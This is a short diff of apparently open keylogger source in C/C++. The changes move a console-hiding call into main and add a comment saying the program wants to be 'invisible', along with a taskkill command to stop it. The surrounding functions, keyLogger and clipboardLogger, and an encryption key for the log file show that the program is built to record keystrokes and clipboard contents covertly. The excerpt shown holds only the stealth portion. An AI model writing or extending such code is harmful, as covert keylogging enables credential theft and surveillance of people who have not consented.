@@ -293,8 +293,6 @@ void clipboardLogger(int key) {
  * @param passwd The key used to encrypt the log file.
  */
 void keyLogger(int passwd) {
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-
     while (true) {
         Sleep(50);
 
@@ -314,7 +312,8 @@ void keyLogger(int passwd) {
 }
 
 int main(int argc, char** argv) {
-    // Hide console window
+    // Hide console while executing the program. We want to be invisible !!
+    // To stop the process: taskkill /IM keylogger.exe /F
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     int key = 88;  // Define your key here (same as the example code)
